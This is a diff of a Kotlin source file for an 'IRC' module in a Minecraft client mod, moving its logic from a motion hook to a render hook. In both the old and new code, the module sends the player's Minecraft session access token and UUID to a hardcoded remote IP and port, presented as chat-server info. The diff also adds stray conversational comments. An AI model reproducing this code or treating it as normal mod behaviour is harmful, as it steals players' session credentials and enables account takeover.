@@ -1,10 +1,11 @@
 package dev.dyzjct.kura.module.modules.client
 
+import base.events.render.Render3DEvent
 import dev.dyzjct.kura.Kura
 import dev.dyzjct.kura.module.Category
 import dev.dyzjct.kura.module.Module
-import dev.dyzjct.kura.utils.TimerUtils
 import helper.kura.socket.packet.GameInfoPacket
+import net.minecraft.text.Text
 
 object IRC : Module(
     name = "IRC",
@@ -14,26 +15,45 @@ object IRC : Module(
 ) {
     val mode by msetting("NoticeMode", Mode.Chat)
 
-    private val reloadTimer = TimerUtils()
+    private var lastName: String? = null
+    override fun onEnable() {
+        this.reset()
+    }
 
     override fun onDisable() {
+        this.reset()
+
         if (Kura.ircSocket.client.isConnected) {
             Kura.ircSocket.client.disconnect()
         }
     }
 
     init {
-        onMotion {
-            if (Kura.ircSocket.client.isConnected) {
-                Kura.ircSocket.send(
+        onRender3D {
+            onRender3D(it)
+        }
+    }
+
+    // 你沒有
+    // 你去問問其他人吧     你需要什么？ 我需要你编写出正确的event写法
+    // xianzheyangba
+    fun onRender3D(event: Render3DEvent) {
+        val nameStr: Text? = mc.player?.name
+
+        if (Kura.ircSocket.client.isConnected) {
+            if (lastName == null || lastName != nameStr.toString()) {
+                Kura.ircSocket.client.send(
                     GameInfoPacket(
-                        player.name.string,
+                        nameStr.toString(),
                         mc.getSession().accessToken,
                         mc.getSession().uuid,
                         System.currentTimeMillis()
                     )
                 )
-            } else if (!Kura.ircSocket.client.isConnecting) {
+                lastName = nameStr.toString()
+            }
+        } else {
+            if (!Kura.ircSocket.client.isConnected) {
                 Kura.ircSocket.client.start("154.9.27.109", 45600)
             }
         }
@@ -41,5 +61,9 @@ object IRC : Module(
 
     enum class Mode {
         Notification, Chat, Both
+    }
+
+    fun reset() {
+        this.lastName = null
     }
 }
